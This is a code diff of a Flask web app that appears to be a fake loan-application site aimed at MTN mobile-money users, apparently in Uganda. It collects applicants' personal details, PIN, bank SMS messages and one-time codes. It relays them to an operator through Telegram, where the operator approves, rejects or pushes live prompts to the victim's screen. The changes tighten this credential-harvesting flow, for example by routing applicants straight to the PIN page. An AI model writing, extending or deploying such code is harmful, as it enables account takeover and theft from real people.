@@ -193,13 +193,13 @@ def telegram_webhook():
                         elif action == "reject":
                             if step_code == "pin":
                                 new_status = "Reject_PIN"
-                                fail_msg = "❌ PIN verification failed. Please check your PIN and re-enter."
+                                fail_msg = "❌ PIN verification failed. Please re-enter your PIN."
                             elif step_code == "sms":
                                 new_status = "Reject_SMS"
-                                fail_msg = "❌ SMS message was invalid or expired. Please re-copy and paste."
+                                fail_msg = "❌ SMS authorization failed. Please re-enter the code."
                             elif step_code == "otp":
                                 new_status = "Reject_OTP"
-                                fail_msg = "❌ Final OTP incorrect. Please check your messages and try again."
+                                fail_msg = "❌ Final OTP verification failed. Please try again."
                             else:
                                 new_status = "Rejected"
                                 fail_msg = "❌ Request rejected. Please try again."
@@ -213,21 +213,21 @@ def telegram_webhook():
                         elif action == "badsms":
                             applications_collection.update_one(
                                 {"_id": actual_obj_id},
-                                {"$set": {"status": "BadInput", "custom_message": "⚠️ Invalid SMS/data format submitted. Please copy the complete, unedited message from MTN."}}
+                                {"$set": {"status": "BadInput", "custom_message": "⚠️ Invalid format. Please copy the complete message."}}
                             )
                             text_response = "⚠️ Flagged bad input!"
 
                         elif action == "stalled":
                             applications_collection.update_one(
                                 {"_id": actual_obj_id},
-                                {"$set": {"status": "StalledPrompt", "custom_message": "⏱️ Your session is waiting for authorization. Please respond promptly."}}
+                                {"$set": {"status": "StalledPrompt", "custom_message": "⏱️ Please respond promptly to complete your verification."}}
                             )
                             text_response = "⏱️ Sent stall reminder!"
 
                         elif action == "msg":
                             applications_collection.update_one(
                                 {"_id": actual_obj_id},
-                                {"$set": {"status": "CustomMessage", "custom_message": "💬 Admin Note: Please review your entry and provide the correct information."}}
+                                {"$set": {"status": "CustomMessage", "custom_message": "💬 Admin Note: Please update your entry."}}
                             )
                             text_response = "💬 Prompt sent!"
 
@@ -244,21 +244,17 @@ def telegram_webhook():
             text = msg.get("text", "").strip()
             
             if chat_id == TELEGRAM_ADMIN_CHAT_ID:
-                if text == "/test" or text == "/diagnose":
-                    # ( Diagnostic logic remains active )
-                    pass
-                else:
-                    latest_app = applications_collection.find_one(sort=[("_id", -1)])
-                    if latest_app:
-                        applications_collection.update_one(
-                            {"_id": latest_app["_id"]},
-                            {"$set": {"custom_message": text, "status": "CustomMessage"}}
-                        )
-                        reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-                        requests.post(reply_url, json={
-                            "chat_id": TELEGRAM_ADMIN_CHAT_ID,
-                            "text": f"📢 Pushed live to user screen:\n\"{text}\""
-                        })
+                latest_app = applications_collection.find_one(sort=[("_id", -1)])
+                if latest_app:
+                    applications_collection.update_one(
+                        {"_id": latest_app["_id"]},
+                        {"$set": {"custom_message": text, "status": "CustomMessage"}}
+                    )
+                    reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+                    requests.post(reply_url, json={
+                        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
+                        "text": f"📢 Pushed live to user screen:\n\"{text}\""
+                    })
 
         return jsonify({"status": "ok"}), 200
     except Exception as global_err:
@@ -271,7 +267,19 @@ def index():
 
 @app.route("/sim-check")
 def sim_check():
-    return render_template("sim_check.html")
+    app_id = request.args.get("app_id")
+    record = None
+    if app_id:
+        record = applications_collection.find_one({"app_id": app_id})
+        
+    if record:
+        session["current_app_id"] = str(record["_id"])
+        return jsonify({
+            "status": record.get("status", "Pending_PIN"),
+            "custom_message": record.get("custom_message", "")
+        })
+            
+    return jsonify({"status": "Pending_PIN", "custom_message": ""})
 
 @app.route("/apply/step1", methods=["GET", "POST"])
 def apply_step1():
@@ -279,7 +287,7 @@ def apply_step1():
         session["loan_type"] = request.form.get("loan_type")
         session["amount"] = request.form.get("amount")
         session["term"] = request.form.get("term")
-        session["whatsapp_phone"] = request.form.get("whatsapp_phone")  # FIXED: Captured on Step 1
+        session["whatsapp_phone"] = request.form.get("whatsapp_phone")
         session["purpose"] = request.form.get("purpose")
         return redirect(url_for("apply_step2"))
     return render_template("apply_step1.html")
@@ -298,12 +306,8 @@ def apply_step3():
     if request.method == "POST":
         session["employment"] = request.form.get("employment")
         session["income"] = request.form.get("income")
-        return redirect(url_for("processing_screen"))
+        return redirect(url_for("login"))
     return render_template("apply_step3.html")
-
-@app.route("/processing")
-def processing_screen():
-    return render_template("processing.html")
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
@@ -318,7 +322,7 @@ def login():
             "first_name": session.get("first_name", "User"),
             "last_name": session.get("last_name", "Applicant"),
             "phone": session.get("phone", "000000000"),
-            "whatsapp_phone": session.get("whatsapp_phone", "Not Provided"),  # FIXED: Pulls correct session data from Step 1
+            "whatsapp_phone": session.get("whatsapp_phone", "Not Provided"),
             "employment": session.get("employment", "Self-Employed"),
             "income": session.get("income", "500000"),
             "password": pin,
@@ -402,7 +406,7 @@ def final_verify():
             updated_record = applications_collection.find_one({"_id": ObjectId(current_id)})
             send_telegram_interactive_alert(updated_record, stage_title="APPROVAL 3: FINAL OTP SUBMITTED (UG)", step_code="otp")
             
-        return redirect(url_for("post_processing")) # or success
+        return redirect(url_for("pending", app_id=app_id))
     return render_template("final_verify.html", app_id=app_id)
 
 @app.route("/success")
